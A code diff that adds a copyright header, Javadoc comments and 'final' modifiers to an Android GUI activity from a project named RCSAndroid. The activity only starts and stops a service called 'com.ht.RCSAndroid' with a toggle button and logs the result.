@@ -1,6 +1,12 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : RCSAndroidGUI.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI;
-
-import com.ht.RCSAndroidGUI.utils.Check;
 
 import android.app.Activity;
 import android.content.ComponentName;
@@ -13,53 +19,70 @@ import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.ToggleButton;
 
+import com.ht.RCSAndroidGUI.utils.Check;
+
+// TODO: Auto-generated Javadoc
+/**
+ * The Class RCSAndroidGUI.
+ */
 public class RCSAndroidGUI extends Activity {
-	
+
+	/** The context. */
 	private static Context context;
 
+	/**
+	 * Gets the app context.
+	 *
+	 * @return the app context
+	 */
 	public static Context getAppContext() {
 		Check.requires(context != null, "Null Context");
 		return context;
 	}
-	
-	/** Called when the activity is first created. */
+
+	/**
+	 * Called when the activity is first created.
+	 *
+	 * @param savedInstanceState the saved instance state
+	 */
 	@Override
-	public void onCreate(Bundle savedInstanceState) {
+	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
 		context = getApplicationContext();
 
 		// Set up click listeners
-		Button runButton = (Button) findViewById(R.id.btntoggle);
+		final Button runButton = (Button) findViewById(R.id.btntoggle);
 		runButton.setOnClickListener(new OnClickListener() {
-			//@Override
-			public void onClick(View v) {
+			// @Override
+			public void onClick(final View v) {
 				if (((ToggleButton) v).isChecked()) {
 					try {
-						ComponentName cn = startService(new Intent(
+						final ComponentName cn = startService(new Intent(
 								"com.ht.RCSAndroid"));
 
 						if (cn == null) {
 							Log.d("RCS", "RCS Service not started");
 						} else {
-							Log.d("RCS",
-									"RCS Service Name: "
-											+ cn.flattenToShortString());
+							Log.d("RCS", "RCS Service Name: "
+									+ cn.flattenToShortString());
 						}
-					} catch (SecurityException se) {
+					} catch (final SecurityException se) {
 						Log.d("RCS",
 								"SecurityException caught on startService()");
 					}
 				} else {
 					try {
 						if (stopService(new Intent("com.ht.RCSAndroid")) == true) {
-							Log.d("RCS",
-									"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
+							Log
+									.d("RCS",
+											"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
 						} else {
-							Log.d("RCS",
-									"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
+							Log
+									.d("RCS",
+											"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
 						}
-					} catch (SecurityException se) {
+					} catch (final SecurityException se) {
 						Log.d("RCS",
 								"SecurityException caught on stopService()");
 					}
@@ -67,7 +90,5 @@ public class RCSAndroidGUI extends Activity {
 			}
 		});
 	}
-
-
 
 }
